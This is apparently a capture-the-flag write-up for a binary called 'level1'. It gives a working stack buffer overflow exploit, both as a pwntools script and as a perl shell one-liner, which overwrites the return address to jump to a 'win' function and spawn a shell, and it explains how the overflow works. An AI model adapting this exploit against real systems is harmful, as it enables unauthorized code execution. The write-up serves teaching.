# Solution with pwntools
```
from pwn import *

#context.log_level = 'debug'
context.local(endian='big')

payload = cyclic(28) + "\xd6\x84\x04\x08"

p = process("./level1")
pause()
p.recvuntil("What is your name :", timeout=0)

p.sendline(payload)

p.interactive()
#p.recvall()
```


# Solution from the shell

`(perl -e 'print "A"x28; print "\xd6\x84\x04\x08";'; cat -) | ./level1`


# Explanation : 
This is a very basic buffer overflow. What is happening is that the fgets function tried to read up to 100 char on the standard input and put it in the `name`  buffer. The problem is that the `name` buffer is only 20 char long. The following bytes are also read and then put on the stack in order. This will overwrite the values on the stack and eventually change the return address of the function, which will lead to a segmentation fault. 

Our goal here is to overwrite the return address with that of another function in the code (the win function). Since almost all protections were removed in the binary file, the memory address where that code lives is static (0x080484d6) and by writing those bytes to the stack, we can jump to the appropriate function and get a shell. Yay!